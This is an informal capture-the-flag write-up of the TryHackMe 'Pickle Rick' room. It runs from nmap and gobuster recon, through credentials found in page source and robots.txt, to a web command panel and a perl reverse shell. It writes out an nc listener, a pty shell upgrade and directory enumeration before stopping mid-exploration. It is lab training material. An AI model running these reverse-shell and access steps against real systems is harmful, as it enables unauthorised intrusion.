# Pickle Rick

# 1. Recon

lets look at the website first. Okay. Nothing special. Looking at the source we have something in the comments:
```

  <!--

    Note to self, remember username!

    Username: R1ckRul3s

  -->

```

nice.
lets try running gobuster meanwhile, along with nmap.

```
❯ nmap -script=default -sV -A -T4 10.10.106.44
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-17 21:19 EST
Nmap scan report for 10.10.106.44
Host is up (0.18s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ac:a3:87:da:73:ba:1a:d5:e1:22:6a:2a:8b:e5:47:be (RSA)
|   256 b7:59:da:b6:2a:7f:b4:2b:89:f5:b1:13:76:ef:a6:d7 (ECDSA)
|_  256 fc:8d:ba:fa:d8:72:41:b7:d5:1b:c7:06:0c:ca:a4:1d (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 32.35 seconds
```


```
❯ gobuster dir -u 10.10.106.44 -w "/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt" -x "html,php,txt"
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.106.44
[+] Threads:        10
[+] Wordlist:       /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,php,txt
[+] Timeout:        10s
===============================================================
2021/02/17 21:20:31 Starting gobuster
===============================================================
/index.html (Status: 200)
/login.php (Status: 200)
/assets (Status: 301)
/portal.php (Status: 302)
```

okay. very interesting stuff. let's try it one by one.

`assets/` show

`robots.txt` shows `Wubbalubbadubdub` :D :D :D

interestingly, when i go to `portal.php`, it redirects me to `login.php`. Maybe there is something there? lets see it in burpsuite.

Nothing. a simple redirect. Okay so lets only look at `login.php`. Maybe there is an XSS attack we care looking at ... nope. tried and didnt work.

But what if ... we have both the username and the password already with us? :D

# 2. Foothold
So we have a command pannel and we can execute stuff. hmmm.

And, we are at the `portal.php` page. gg.

`ls`
```
Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt
```

so denied is ... well something we should expect to pop onto us as an error soon.

It also looks like the `cat` command is disabled. So, lets try alternatives ...
`less` works!

`less clue.txt`: `Look around the file system for the other ingredient.`

okay ...

`less Sup3rS3cretPickl3Ingred.txt`: `mr. meeseek hair`

ew, but yay!


Okay. so now i'm trying to `cd ..` but it doesn't wanna work. we did have the ssh port open, so ...

```
❯ ssh R1ckRul3s@10.10.106.44
The authenticity of host '10.10.106.44 (10.10.106.44)' can't be established.
ECDSA key fingerprint is SHA256:LWuQ+4VfPBKeYlbudgcUF9iFM6hG7u/vjzjziKLavsk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.106.44' (ECDSA) to the list of known hosts.
R1ckRul3s@10.10.106.44: Permission denied (publickey).
```

so first we need to put our public key in the list of ssh's `authorized_keys` file. But how do we get in ...?

Let's try settup up `nc` and get a bash reverse shell going on. Get your own ip by `❯ ifconfig tun0`. I'm taking the reverse shells from `http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet`

```
❯ nc -lnvp 4242
listening on [any] 4242 ...
```


hmm. bash gives nothing. 
let's try perl. 

# I'm IN!

So perl reverse shell works! Now, let's upgrade our shell by `$ python3 -c 'import pty; pty.spawn("/bin/bash")'`


```
www-dataÄip-10-10-106-44:/home/rick$ whoami
whoami
www-data
```

exploring, we have:
```
www-dataÄip-10-10-106-44:/home/rick$ ls -la      
ls -la
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients
```

```
www-dataÄip-10-10-106-44:/home/ubuntu$ ls -la
ls -la
total 40
drwxr-xr-x 4 ubuntu ubuntu 4096 Feb 10  2019 .
drwxr-xr-x 4 root   root   4096 Feb 10  2019 ..
-rw------- 1 ubuntu ubuntu  320 Feb 10  2019 .bash_history
-rw-r--r-- 1 ubuntu ubuntu  220 Aug 31  2015 .bash_logout
-rw-r--r-- 1 ubuntu ubuntu 3771 Aug 31  2015 .bashrc
drwx------ 2 ubuntu ubuntu 4096 Feb 10  2019 .cache
-rw-r--r-- 1 ubuntu ubuntu  655 May 16  2017 .profile
drwx------ 2 ubuntu ubuntu 4096 Feb 10  2019 .ssh
-rw-r--r-- 1 ubuntu ubuntu    0 Feb 10  2019 .sudo_as_admin_successful
-rw------- 1 ubuntu ubuntu 4267 Feb 10  2019 .viminfo
```

some tryhackme bt. ill brb 
